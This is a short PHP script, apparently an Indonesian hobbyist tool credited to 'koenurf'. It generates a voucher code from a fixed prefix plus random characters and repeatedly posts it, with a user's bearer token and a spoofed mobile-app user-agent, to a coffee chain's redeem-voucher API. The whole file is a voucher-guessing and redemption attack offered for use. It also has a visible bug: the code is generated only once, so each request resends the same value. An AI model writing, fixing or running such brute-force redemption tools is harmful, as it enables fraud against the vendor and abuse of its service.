<?php
$kode="ET85Q";
$n=1;
function S1($n) { 
    $characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
    $randomString = ''; 
  
    for ($i = 0; $i < $n; $i++) { 
        $index = rand(0, strlen($characters) - 1); 
        $randomString .= $characters[$index]; 
    } 
  
    return $randomString; 
} 

function SN1($n) { 
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
    $randomString = ''; 
  
    for ($i = 0; $i < $n; $i++) { 
        $index = rand(0, strlen($characters) - 1); 
        $randomString .= $characters[$index]; 
    } 
  
    return $randomString; 
} 

function S2($n) { 
    $characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
    $randomString = ''; 
  
    for ($i = 0; $i < $n; $i++) { 
        $index = rand(0, strlen($characters) - 1); 
        $randomString .= $characters[$index]; 
    } 
  
    return $randomString; 
} 

function SN2($n) { 
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
    $randomString = ''; 
  
    for ($i = 0; $i < $n; $i++) { 
        $index = rand(0, strlen($characters) - 1); 
        $randomString .= $characters[$index]; 
    } 
  
    return $randomString; 
} 
$getS1 = S1($n);
$getSN1 = SN1($n);
$getS2 = S2($n);
$getSN2 = SN2($n);
  
$generate = $kode.$getS1.$getSN1.$getS2.$getSN2;

# by koenurf
# fb.com/koe.nurf
echo "\n# k{}enurf #\n\n";
$date = date("Y-m-d");
function yt($jumlah,$jeda,$token,$text){
$headers = array("Authorization: Bearer $token",
"ApiVersion: 200217001",
"Cache-Control: no-cache",
"Connection: keep-alive",
"Content-Type: application/json; charset=UTF-8",
"Host: v2.toraccino.com",
"User-Agent: okhttp/3.10.0");

    $x = 0; 
    while($x < $jumlah) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://v2.toraccino.com/user/redeem-voucher-code");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $text);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
        $output = curl_exec($ch);
        curl_close($ch);
        echo $output."\n";
        sleep($jeda);
        $x++;
        flush();    
    }
}
echo "Token";
$token = trim(fgets(STDIN));
$text = '{"voucherCode":"'.$generate.'"}';
echo "Jumlah: ";
$jumlah = trim(fgets(STDIN));
echo "Jeda: ";
$jeda = trim(fgets(STDIN));
$do = yt($jumlah,$jeda,$token,$text);
print $do;

?> 
